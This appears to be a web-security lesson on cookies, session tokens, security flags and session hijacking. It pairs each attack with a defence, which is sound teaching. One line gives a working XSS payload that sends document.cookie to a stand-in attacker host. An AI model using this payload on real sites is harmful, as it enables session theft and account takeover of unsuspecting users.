🍪 Cookies, Sessions & Hijacking

Cookies are how websites remember who you are. Session tokens inside cookies are the keys to your account. XSS steals those keys — and with them, the attacker becomes you.

⏱️ ~20 minutes 📖 Reading + Interactive ⚡ Live simulation
🍪 What Cookies Are and Why They Exist

HTTP is a stateless protocol — each request is independent. The server has no built-in memory of previous requests. When you log in, how does the server know the next page request is also from you?

The answer is cookies. After login, the server sends a Set-Cookie header with a unique token. The browser stores it and automatically attaches it to every subsequent request to that domain. The server reads it, looks up the session, and knows who you are.

This is elegant and practical. It is also the reason that stealing a cookie = stealing an identity. The attacker does not need your password — they just need your token.

Step 1 — Login request
POST /login HTTP/1.1
Host: bank.example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=hunter2
Step 2 — Server response: sets a session cookie
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: sessionid=a3f9b2c1d8e74f6a; Path=/; HttpOnly; Secure; SameSite=Strict
← browser stores this, sends it on every request
Step 3 — Every subsequent request carries the cookie automatically
GET /dashboard HTTP/1.1
Host: bank.example.com
Cookie: sessionid=a3f9b2c1d8e74f6a
← server reads this, looks it up, knows it's Alice
ℹ️ The cookie is the identity
The server does not know your name, your IP, or anything about you on each request — it only knows your session token. If an attacker has that token, they can paste it into their own browser and the server will treat them as you. No password needed. No 2FA bypass needed. Just the token.
🚩 Security Flags — The Lines That Protect Cookies

Every cookie can carry optional security flags in its Set-Cookie header. These flags are the difference between a cookie that can be stolen by XSS and one that cannot. Missing a single flag can undo everything else.

HttpOnly
Prevents JavaScript from reading the cookie via document.cookie. Even if XSS is present, the attacker's script cannot access this cookie. This is the single most important flag for session tokens.
✅ Always set on session tokens
Secure
Cookie is only sent over HTTPS connections — never over plain HTTP. Prevents cookie theft via network eavesdropping (man-in-the-middle on HTTP). Useless without HTTPS on your site.
✅ Always set in production
SameSite=Strict
Cookie is never sent on cross-site requests. Completely blocks CSRF attacks — the attacker's page cannot trigger authenticated requests because the browser withholds the cookie.
✅ Best CSRF protection
SameSite=Lax
Cookie is sent on top-level navigations (clicking links) but not on cross-site subresource requests. A balanced default — most browsers now use Lax when SameSite is not set.
⚠️ Good default, not perfect
SameSite=None
Cookie is sent on all requests including cross-site. Required for embedded widgets and third-party integrations, but opens the door to CSRF. Must be combined with Secure.
⚠️ Only when necessary
Expires / Max-Age
Controls how long the cookie lives. Session cookies (no Expires) die when the browser closes. Persistent cookies with long expiry survive restarts — a stolen persistent cookie stays valid longer.
⚠️ Keep session tokens short-lived

🔐 The XSS + Missing HttpOnly Combination
When HttpOnly is missing, any XSS payload can run document.cookie and read the session token directly. The attacker sends it to their server with a single line: new Image().src='https://attacker.com/steal?c='+document.cookie. The victim never sees anything. The attacker now has a valid session. 🔄 The Session Lifecycle

Understanding the full lifecycle of a session — from login to logout — reveals exactly where attacks are possible and why the fixes work.

1

User logs in — credentials verified

Server checks username and password. If valid, generates a random, unpredictable session token (e.g. a cryptographically secure 128-bit random value).

2

Server stores token and sends it to browser

Token is stored server-side (database or cache) mapped to the user. Sent to browser via Set-Cookie: sessionid=TOKEN; HttpOnly; Secure; SameSite=Strict.

3

Browser attaches cookie to every request automatically

No developer code needed. The browser handles this. Every GET, POST, AJAX request to the same domain carries the cookie in the Cookie: header.

4

Server validates token on every request

Server reads cookie, looks up token in session store, retrieves the associated user. If token is valid → request is authorised. If missing or invalid → redirect to login.

5

XSS attack — token stolen mid-session

If XSS fires while the user is logged in, attacker's script runs document.cookie, reads the token, and exfiltrates it. The server has no way to detect this.

6

Logout — server invalidates the token

Proper logout deletes the session server-side. Even if the attacker already has the token, it becomes useless. This is why client-side-only logout (just deleting the cookie) is insufficient.

🕵️ What Happens After the Token Is Stolen
ActionHow it worksDefence
Session Replay Attacker pastes stolen token into browser DevTools → Application → Cookies and reloads. Server grants full access immediately. Short session expiry, IP binding (limited), re-authentication for sensitive actions
Account Takeover Attacker changes email/password while in the victim's session, locking them out permanently. Require current password confirmation for credential changes
Data Exfiltration Attacker silently downloads all data the victim has access to — emails, files, records. Anomaly detection, rate limiting, session activity logging
Privilege Escalation If the victim is an admin, the attacker inherits admin privileges. Can create new admin accounts. Separate admin sessions, step-up authentication for admin functions
Stored XSS Propagation Attacker uses admin access to inject Stored XSS that steals tokens from all subsequent visitors. Output encoding everywhere, strict CSP, regular code audits
⚠️ The attack chain in practice
A single stored XSS in a comment field + missing HttpOnly flag + admin visiting the page = attacker has admin session token. From there: create a backdoor admin account, download all user data, inject more XSS. The entire breach traces back to one missing flag and one unescaped < character.
